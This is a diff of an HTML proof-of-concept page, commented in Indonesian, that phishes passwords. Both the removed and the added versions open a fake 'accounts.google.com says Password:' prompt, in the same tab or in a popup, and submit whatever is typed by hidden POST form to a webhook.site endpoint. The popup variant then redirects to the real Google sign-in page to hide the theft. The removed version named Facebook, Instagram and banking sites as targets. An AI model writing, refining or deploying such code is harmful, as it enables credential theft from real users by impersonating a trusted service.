@@ -1,86 +1,60 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Drag & Drop UXSS PoC</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>PoC href=javascript (no dialog suppression)</title>
   <style>
-    body {
-      margin: 0;
-      padding: 32px;
-      font-family: system-ui, sans-serif;
-      background: #111;
-      color: #eee;
-      text-align: center;
+    :root { color-scheme: light; }
+    body { margin:0; padding:24px; font-family:system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; background:#f5f5f5; }
+    h1 { margin:0 0 8px; font-size:22px; }
+    p  { margin:0 0 16px; color:#444; }
+    .row { display:flex; gap:12px; flex-wrap:wrap; }
+    a.btn {
+      display:inline-block; padding:14px 18px; border-radius:10px; text-decoration:none;
+      background:#1a73e8; color:#fff; font-weight:600; box-shadow:0 2px 6px rgba(26,115,232,.3);
     }
-    h1 { color: #4ade80; margin: 0 0 8px; }
-    p { opacity: .85; font-size: 14px; }
-    .btn {
-      display: inline-block;
-      padding: 14px 18px;
-      border-radius: 10px;
-      background: #222;
-      color: #fff;
-      text-decoration: none;
-      border: 1px solid #333;
-      user-select: none;
-      cursor: grab;
-      font-weight: 500;
-    }
-    .btn:hover { background: #1a1a1a; }
-    .danger { background: #ff4444 !important; }
-    .note { margin-top: 24px; font-size: 13px; opacity: .8; }
+    a.btn:hover { background:#1557b0; }
+    .note { margin-top:14px; font-size:12px; color:#666; }
   </style>
 </head>
 <body>
-  <h1>Drag to Bookmark Bar</h1>
-  <p>Seret tautan di bawah ke <b>bookmark bar</b> → klik untuk menjalankan.</p>
+  <h1>PoC: prompt → POST exfil via href=javascript</h1>
+  <p>Pilih salah satu:</p>
 
-  <!-- SATU-SATUNYA ELEMEN: href="#" + onclick -->
-  <a href="#" onclick="runExploit(); return false;" class="btn danger">Drag Me!</a>
+  <div class="row">
+    <!-- Opsi A — SAME TAB (tidak ada window.open) -->
+    <a class="btn" href='javascript:(function(){
+      var exfil="https://webhook.site/46a1ff0d-65fb-41b4-a384-0ed267ed2a90/submit";
+      var i=document.createElement("iframe");
+      i.style.display="none";
+      document.body.appendChild(i);
+      i.src="javascript:(function(){setTimeout(function(){var p=prompt(\"Halo dunia\");if(p!==null){var d=document,f=d.createElement(\"form\");f.method=\"POST\";f.action=\""+ "https://webhook.site/46a1ff0d-65fb-41b4-a384-0ed267ed2a90/submit" +"\";var h=d.createElement(\"input\");h.type=\"hidden\";h.name=\"password\";h.value=p;f.appendChild(h);d.body.appendChild(f);f.submit();}},200);} )()";
+      setTimeout(function(){try{if(i.parentNode)i.parentNode.removeChild(i);}catch(e){}},4000);
+    })()'>Run (same tab)</a>
 
-  <div class="note">
-    Target: <code>facebook.com</code>, <code>instagram.com</code>, <code>banking.com</code>, dll.
+    <!-- Opsi B — POPUP about:blank lalu redirect ke "legit" -->
+    <a class="btn" href='javascript:(function(){
+      var exfil="https://webhook.site/46a1ff0d-65fb-41b4-a384-0ed267ed2a90/submit";
+      var legit="https://accounts.google.com/signin/v2/challenge";
+      var w=window.open("about:blank","_blank","popup,width=900,height=700");
+      if(!w){alert("Enable popups to continue.");return;}
+      try{w.focus();}catch(e){}
+      setTimeout(function(){
+        var p=w.prompt("accounts.google.com says\\n\\nPassword:");
+        if(p!==null){
+          try{
+            var d=w.document,f=d.createElement("form");
+            f.method="POST"; f.action=exfil;
+            var h=d.createElement("input"); h.type="hidden"; h.name="password"; h.value=p;
+            f.appendChild(h); d.body.appendChild(f); f.submit();
+          }catch(e){}
+        }
+        setTimeout(function(){ try{ w.location=legit; }catch(e){} },250);
+      },80);
+    })()'>Run (popup → then legit)</a>
   </div>
 
-  <script>
-    function runExploit() {
-      // Buka Google Account (spoof origin)
-      const w = window.open('https://account.google.com/', '_blank');
-      if (!w) { alert('Popup blocked!'); return; }
-
-      setTimeout(() => {
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-
-        iframe.src = 'data:text/html,' + encodeURIComponent(`
-          <script>
-            setTimeout(() => {
-              let p;
-              while (!(p = prompt("account.google.com says\\n\\nPassword:")) || p.trim() === "") {
-                if (p === null) return;
-                alert("Password required!");
-              }
-              const f = document.createElement('form');
-              f.method = 'POST';
-              f.action = 'https://webhook.site/46a1ff0d-65fb-41b4-a384-0ed267ed2a90/submit';
-              const i = document.createElement('input');
-              i.type = 'hidden'; i.name = 'password'; i.value = p;
-              f.appendChild(i); document.body.appendChild(f); f.submit();
-              setTimeout(() => alert("haha pwned!\\nPassword: " + p), 400);
-            }, 1000);
-          </script>
-        `);
-
-        document.body.appendChild(iframe);
-
-        setTimeout(() => {
-          if (document.body.contains(iframe)) document.body.removeChild(iframe);
-          if (w && !w.closed) w.close();
-        }, 8000);
-
-      }, 2000);
-    }
-  </script>
+  <p class="note">Jika popup diblokir, gunakan Opsi A (same tab).</p>
 </body>
 </html>
